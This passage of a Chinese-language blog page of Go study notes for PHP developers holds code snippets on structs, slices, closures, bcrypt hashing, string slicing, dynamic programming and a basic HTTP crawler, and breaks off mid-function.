o.Raw(<span class="string">"select  *  from  classify"</span>).QueryRows(&amp;com)</span><br><span class="line">  <span class="keyword">if</span>  err  ==  nil  &#123;</span><br><span class="line">  fmt.Println(num)</span><br><span class="line">  fmt.Println(comments)</span><br><span class="line">  fmt.Println(com)</span><br><span class="line">  c.Data[<span class="string">"updates"</span>]  =  comments</span><br><span class="line">  c.Data[<span class="string">"comment"</span>]  =  com</span><br><span class="line">  &#125;  <span class="keyword">else</span>  &#123;</span><br><span class="line">  fmt.Println(<span class="string">"查询报错"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  c.TplName  =  <span class="string">"type.html"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="php-go的类"><a href="#php-go的类" class="headerlink" title="php go的类"></a>php go的类</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $height;</span><br><span class="line">    public $weight;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $height, $weight</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;name = $name;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;height = $height;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;weight = $weight;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'name'</span>   =&gt; $<span class="keyword">this</span>-&gt;name,</span><br><span class="line">            <span class="string">'height'</span> =&gt; $<span class="keyword">this</span>-&gt;height,</span><br><span class="line">            <span class="string">'weight'</span> =&gt; $<span class="keyword">this</span>-&gt;weight,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/articles/26056</span></span><br><span class="line">package main</span><br><span class="line">type Animal struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">    Height uint</span><br><span class="line">    Weight uint</span><br><span class="line">&#125;</span><br><span class="line">func NewAnimal(name string, height, weight uint) Animal &#123;</span><br><span class="line">    <span class="keyword">return</span> Animal&#123;</span><br><span class="line">        Name: name,</span><br><span class="line">        Height: height,</span><br><span class="line">        Weight: weight,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">func (a *Animal) GetInfo() map[string]interface&#123;&#125; &#123;</span><br><span class="line">    <span class="keyword">return</span> map[string]interface&#123;&#125;&#123;</span><br><span class="line">        <span class="string">"name"</span>: a.Name,</span><br><span class="line">        <span class="string">"height"</span>: a.Height,</span><br><span class="line">        <span class="string">"weight"</span>: a.Weight,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Go-for-PHP-Developers-Structs-vs-Classes"><a href="#Go-for-PHP-Developers-Structs-vs-Classes" class="headerlink" title="Go for PHP Developers: Structs vs Classes"></a>Go for PHP Developers: Structs vs Classes</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">type Animal struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">    Height uint</span><br><span class="line">    Weight uint</span><br><span class="line">&#125;</span><br><span class="line">func NewAnimal(name string, height, weight uint) Animal &#123;</span><br><span class="line">    <span class="keyword">return</span> Animal&#123;</span><br><span class="line">        Name: name,</span><br><span class="line">        Height: height,</span><br><span class="line">        Weight: weight,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://learnku.com/articles/26056#reply85350 定义不同类似的结构体</span></span><br><span class="line">func (a *Animal) GetInfo() map[string]interface&#123;&#125; &#123;</span><br><span class="line">    <span class="keyword">return</span> map[string]interface&#123;&#125;&#123;</span><br><span class="line">        <span class="string">"name"</span>: a.Name,</span><br><span class="line">        <span class="string">"height"</span>: a.Height,</span><br><span class="line">        <span class="string">"weight"</span>: a.Weight,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">package main</span><br><span class="line">type AnimalContract interface &#123;</span><br><span class="line">    GetInfo() map[string]interface&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">type Animal struct &#123;</span><br><span class="line">    <span class="comment">// Struct def...</span></span><br><span class="line">&#125;</span><br><span class="line">func (a *Animal) GetInfo() map[string]interface&#123;&#125; &#123;</span><br><span class="line">    <span class="comment">// Method body... 继承AnimalContract 如果我们定义一个定义该接口的结构，它将隐式继承它。</span></span><br><span class="line">&#125;</span><br><span class="line">package main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line">func main()&#123;</span><br><span class="line">   <span class="keyword">var</span> array = [<span class="number">9</span>]interface&#123;&#125;&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="string">"index"</span>&#125;</span><br><span class="line">   fmt.Print(array)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="append-扩容"><a href="#append-扩容" class="headerlink" title="append 扩容"></a>append 扩容</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package array</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * arr 底层扩容知识点https://learnku.com/articles/27630#topnav</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">func ArrayAppend() []int &#123;</span><br><span class="line">    arr := make([]int,<span class="number">5</span>)</span><br><span class="line">    fmt.Printf(<span class="string">"arr.len: %d; arr.cap: %d \n"</span>, len(arr),cap(arr))</span><br><span class="line">    arr = append(arr,<span class="number">10</span>)</span><br><span class="line">    <span class="comment">//问现在 arr 结果是什么</span></span><br><span class="line">    fmt.Printf(<span class="string">"arr.len: %d; arr.cap: %d \n"</span>, len(arr),cap(arr))</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="go-build"><a href="#go-build" class="headerlink" title="go build"></a>go build</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">工作区是 Go 便捷管理项目的方式。一言以蔽之，它就是你系统上的一个目录，Go 可以在此 查找源码 文件，管理依赖包 还有 分发二进制文件。 当 Go 程序命中 <span class="keyword">import</span> 语句，它就会去 Go 标准库 (*$GOROOT/src*) 中寻找响应的包。如果没找到，然后 Go 就会引用环境变量 GOPATH ，它是 Go 工作区目录的路径，然后再去 $GOPATH/src 目录下寻找这个包。</span><br><span class="line"></span><br><span class="line">你可以按需指定多个工作区，只要你保证 GOPATH 环境变量指向你的工作区目录即可。</span><br><span class="line">一个 Go 工作区目录必须有三个子目录也就是: src, pkg and bin</span><br><span class="line">src 目录包含 Package. Package 包括一个包含 Go 源代码 (*.go* files) 。 任何使用 <span class="string">'go get'</span> 命令安装的包也将驻留在这里 (及其依赖包)。</span><br><span class="line"></span><br><span class="line">在 Go 中，每个程序都包含在一个包中。 因此，无论何时您将使用新的 Go 项目，您都需要在 $GOPATH/src 中创建新目录并向上工作。</span><br><span class="line">当执行 go run hello.go 命令时，Go 编译器会首先编译 hello.go 文件，然后执行里面的二进制代码。</span><br><span class="line"></span><br><span class="line">Go 程序支持输出二进制文件，执行 go build &lt;package-name&gt; (main 包) 或 go build program/path.go 命令即可在当前文件夹创建二进制文件。</span><br><span class="line">执行 go install 命令就可以创建这些文件。 go install 命令会触发底层的 go build 命令，然后将这些文件保存到 bin 目录中。通常情况下，这个目录是在系统的可执行路径中。因此，这个目录中的所有文件都是可以通过终端来操作的。</span><br><span class="line">https:<span class="comment">//learnku.com/golang/t/26863</span></span><br><span class="line">go run main.go </span><br><span class="line">go build main.go</span><br><span class="line">go install test #main.go在test目录</span><br></pre></td></tr></table></figure>
<h3 id="for-循环迭代变量"><a href="#for-循环迭代变量" class="headerlink" title="for 循环迭代变量"></a>for 循环迭代变量</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice []func()</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	sli := []int&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">v</span> := range sli &#123;</span><br><span class="line">		fmt.Println(&amp;v)</span><br><span class="line">		slice = append(slice, func()&#123;</span><br><span class="line">			fmt.Println(v * v) <span class="comment">// 直接打印结果</span></span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//v 在 for 循环引进的一个块作用域内进行声明。在循环里创建的所有函数变量共享相同的变量，就是一个可访问的存储位置，而不是固定的值。(你会惊奇的发现 &amp;v 的内存地址是一样的)https://www.njphper.com/posts/974e86a6.html</span></span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">val</span>  := range slice &#123;</span><br><span class="line">		val()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 25 25 25 25 25</span></span><br><span class="line"><span class="keyword">var</span> slice []func()</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	sli := []int&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">v</span> := range sli &#123;</span><br><span class="line">	    temp := v <span class="comment">// 其实很简单 引入一个临时局部变量就可以了，这样就可以将每次的值存储到该变量地址上</span></span><br><span class="line">		fmt.Println(&amp;temp) <span class="comment">// 这里内存地址是不同的</span></span><br><span class="line">		slice = append(slice, func()&#123;</span><br><span class="line">			fmt.Println(temp *  temp) <span class="comment">// 直接打印结果</span></span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> _, <span class="attr">val</span>  := range slice &#123;</span><br><span class="line">		val()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出 1, 4, 9, 16, 25 预期结果</span></span><br></pre></td></tr></table></figure>
<h3 id="实现-PHP-的密码加密解密"><a href="#实现-PHP-的密码加密解密" class="headerlink" title="实现 PHP 的密码加密解密"></a>实现 PHP 的密码加密解密</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line">#https://www.njphper.com/posts/f3f0ab9c.html</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"log"</span></span><br><span class="line">    <span class="string">"golang.org/x/crypto/bcrypt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">       <span class="comment">// 输入密码 获取 hash 值</span></span><br><span class="line">        pwd := getPwd()</span><br><span class="line">        hash := hashAndSalt(pwd)</span><br><span class="line">       <span class="comment">// 再次输入密码验证</span></span><br><span class="line">        pwd2 := getPwd()</span><br><span class="line">        pwdMatch := comparePasswords(hash, pwd2)</span><br><span class="line">        fmt.Println(<span class="string">"Passwords Match?"</span>, pwd)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func getPwd() []byte &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Enter a password"</span>)</span><br><span class="line">    <span class="keyword">var</span> pwd string</span><br><span class="line">    _, <span class="attr">err</span> := fmt.Scan(&amp;pwd)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> []byte(pwd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func hashAndSalt(pwd []byte) string &#123;</span><br><span class="line">    hash, <span class="attr">err</span> := bcrypt.GenerateFromPassword(pwd, bcrypt.MinCost)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> string(hash)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func comparePasswords(hashedPwd string, plainPwd []byte) bool &#123;</span><br><span class="line">    byteHash := []byte(hashedPwd)</span><br><span class="line"></span><br><span class="line">    err := bcrypt.CompareHashAndPassword(byteHash, plainPwd)</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">        log.Println(err)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">str := <span class="string">`&#123;"page": 1, "fruits": ["apple", "peach"]&#125;`</span></span><br><span class="line">实例化了一个 json 字符串，fruits 对应的是一个数组。</span><br><span class="line">在 Go 语言中，字符串字面量可以使用双引号 <span class="string">""</span> 或者反引号 <span class="string">' 来创建</span></span><br></pre></td></tr></table></figure>
<h3 id="截取中文"><a href="#截取中文" class="headerlink" title="截取中文"></a>截取中文</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">first := <span class="string">"fisrt"</span></span><br><span class="line">fmt.Println([]rune(first))</span><br><span class="line">fmt.Println([]byte(first))</span><br><span class="line">[]rune(s), 它可以将字符串转化成 unicode 码点</span><br><span class="line">byte 表示一个字节，rune 表示四个字节</span><br><span class="line">first := <span class="string">"社区"</span></span><br><span class="line">fmt.Println([]rune(first))</span><br><span class="line">fmt.Println([]byte(first))</span><br><span class="line">[<span class="number">31038</span> <span class="number">21306</span>] <span class="comment">//输出结果[]rune</span></span><br><span class="line">[<span class="number">231</span> <span class="number">164</span> <span class="number">190</span> <span class="number">229</span> <span class="number">140</span> <span class="number">186</span>]<span class="comment">//输出结果[]byte</span></span><br><span class="line">s := <span class="string">"截取中文"</span></span><br><span class="line"><span class="comment">//试试这样能不能截取?</span></span><br><span class="line">fmt.Println(s[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">s := <span class="string">"截取中文"</span></span><br><span class="line"><span class="comment">//试试这样能不能截取? https://www.njphper.com/posts/c251fcd3.html</span></span><br><span class="line">res := []rune(s)</span><br><span class="line">fmt.Println(string(res[:<span class="number">2</span>]))</span><br></pre></td></tr></table></figure>
<h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">硬币问题：如果我们有面值为<span class="number">1</span>元、<span class="number">3</span>元和<span class="number">5</span>元的硬币若干枚，如何用最少的硬币凑够<span class="number">11</span>元？https:<span class="comment">//blog.mutoe.com/2019/dynamic-programming/</span></span><br><span class="line"><span class="comment">// CoinChange: coins 硬币, amount 期望的金额, 返回最少需要的硬币数量，如果不可解返回-1</span></span><br><span class="line">func CoinChange(coins []int, amount int) int &#123;</span><br><span class="line">  dp := make([]int, amount+<span class="number">1</span>)</span><br><span class="line">  dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= amount; i++ &#123;</span><br><span class="line">    dp[i] = amount + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">coin</span> := range coins &#123;</span><br><span class="line">      <span class="keyword">if</span> coin &lt;= i &amp;&amp; dp[i-coin] != <span class="number">-1</span> &amp;&amp; dp[i-coin]+<span class="number">1</span> &lt; dp[i] &#123;</span><br><span class="line">        dp[i] = dp[i-coin] + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> dp[i] &gt; amount &#123;</span><br><span class="line">      dp[i] = <span class="number">-1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> dp[amount]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="go-php-对比学习"><a href="#go-php-对比学习" class="headerlink" title="go php 对比学习"></a>go php 对比学习</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//learnku.com/golang/t/23385/from-a-php-engineers-point-of-view-go</span></span><br><span class="line"></span><br><span class="line">first, second = second, first</span><br><span class="line">func getName() (string, string) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>, <span class="string">"world"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">first, last = getName()</span><br><span class="line"><span class="comment">// foreach ($bookings as $key =&gt; $booking) &#123;&#125;</span></span><br><span class="line"><span class="keyword">for</span> key, <span class="attr">booking</span> := range bookings &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// for ($i = 0; $i &lt; count($bookings); $i++) &#123;&#125;</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; len(bookings); i++ &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// while ($i &lt; count($bookings)) &#123;&#125;</span></span><br><span class="line"><span class="keyword">for</span> i &lt; len(bookings) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// do &#123;&#125; while (true);</span></span><br><span class="line"><span class="keyword">for</span> &#123;&#125;</span><br><span class="line">type rect struct &#123; <span class="comment">// 定义一个结构体</span></span><br><span class="line">    width  int</span><br><span class="line">    height int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (r *rect) area() int &#123; <span class="comment">// 在结构体上添加方法</span></span><br><span class="line">    <span class="keyword">return</span> r.width * r.height</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r := rect&#123;<span class="attr">width</span>: <span class="number">10</span>, <span class="attr">height</span>: <span class="number">15</span>&#125; <span class="comment">// 初始化</span></span><br><span class="line">fmt.Print(r.area())</span><br><span class="line">type Employee struct &#123;</span><br><span class="line">    Name string</span><br><span class="line">    Job  Job</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Job struct &#123;</span><br><span class="line">    Employer string</span><br><span class="line">    Position string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 并去结构化它</span></span><br><span class="line">e := Employee&#123;</span><br><span class="line">    Name: <span class="string">"Sobit"</span>,</span><br><span class="line">    Job: &#123;</span><br><span class="line">        Employer: <span class="string">"GetYourGuide"</span>,</span><br><span class="line">        Position: <span class="string">"Software Engineer"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;func heartbeat() &#123;</span><br><span class="line">     <span class="keyword">for</span> &#123;</span><br><span class="line">         time.Sleep(time.Second)</span><br><span class="line">         fmt.Println(<span class="string">"I'm still running..."</span>)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> 现在， 我们怎样才能让这个函数在后台执行并且允许我们并行的做其他事呢？ 答案比你想象中要简单， 只需要在执行函数前加一个 go :</span><br><span class="line"> </span><br><span class="line"> go heartbeat()</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 继续做其他事</span></span><br><span class="line"> Go 自带开箱即用关注代码风格的 go fmt 工具。 不再需要分享 IDE 的配置文件， 不用尝试记住大括号应该是在同一行还是再起一行。</span><br><span class="line"> </span><br><span class="line"> 可以使用 go doc 去阅读源码包文档， 而 go vet 将会协助我们查找代码中的问题。 安装第三方包只需要执行 go get [github.com/[vendor]/[package](http:<span class="comment">//github.com/[vendor]/[package)] 指令， 测试只需要执行 go test [package] 指令。</span></span><br></pre></td></tr></table></figure>
<h3 id="用Golang写爬虫"><a href="#用Golang写爬虫" class="headerlink" title="用Golang写爬虫"></a>用Golang写爬虫</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"io/ioutil"</span></span><br><span class="line">	<span class="string">"net/http"</span></span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">	fmt.Println(<span class="string">"Hello, world"</span>)</span><br><span class="line">	url := <span class="string">"http://www.baidu.com/"</span></span><br><span class="line">	download(url)</span><br><span class="line">&#125;</span><br><span class="line">func download(url string) &#123;</span><br><span class="line">	client := &amp;http.Client&#123;&#125;</span><br><span class="line">	req, <span class="attr">_</span> := http.NewRequest(<span class="string">"GET"</span>, url, nil)</span><br><span class="line">	<span class="comment">// 自定义Header</span></span><br><span class="line">	req.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"</span>)</span><br><span class="line">	resp, <span class="attr">err</span> := client.Do(req)</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		fmt.Println(<span class="string">"http get error"</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//函数结束后关闭相关链接https://zhangslob.github.io/2019/01/16/Golang%E5%86%99%E7%88%AC%E8%99%AB/</span></span><br><span class="line">	defer resp.Body.Close()</span><br><span class="line">	body, <span class="attr">err</span> := ioutil.ReadAll(resp.Body)</span><br><span class="line">	<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">		